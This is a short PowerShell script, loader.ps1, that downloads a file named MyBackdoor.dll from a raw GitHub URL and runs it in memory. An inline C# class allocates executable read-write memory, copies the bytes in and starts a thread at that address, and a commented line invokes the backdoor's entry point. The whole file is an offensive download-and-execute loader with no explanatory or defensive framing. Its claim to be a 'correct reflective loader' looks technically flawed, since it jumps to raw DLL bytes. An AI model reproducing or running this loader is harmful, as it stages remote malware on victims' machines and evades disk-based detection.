# loader.ps1

# 1) Download the DLL bytes
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
$dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)

# 2) Define a correct reflective loader
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class ReflectiveLoader {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flAllocationType,
        uint flProtect
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        UIntPtr dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );

    public static void LoadAndRun(byte[] rawAssembly) {
        // Allocate RWX memory
        IntPtr addr = VirtualAlloc(
            IntPtr.Zero,
            (UIntPtr)rawAssembly.Length,
            0x1000 | 0x2000,  // MEM_COMMIT | MEM_RESERVE
            0x40              // PAGE_EXECUTE_READWRITE
        );

        // Copy the DLL bytes into that memory
        Marshal.Copy(rawAssembly, 0, addr, rawAssembly.Length);

        // Create a thread at the start of that region
        uint threadId;
        IntPtr hThread = CreateThread(
            IntPtr.Zero,
            UIntPtr.Zero,
            addr,
            IntPtr.Zero,
            0,
            out threadId
        );

        // Wait indefinitely for the thread to finish (optional)
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
"@

# 3) Invoke the loader
[ReflectiveLoader]::LoadAndRun($dllBytes)

# 4) (Optional) call your backdoor entry
# [MyBackdoor.Entry]::Start()
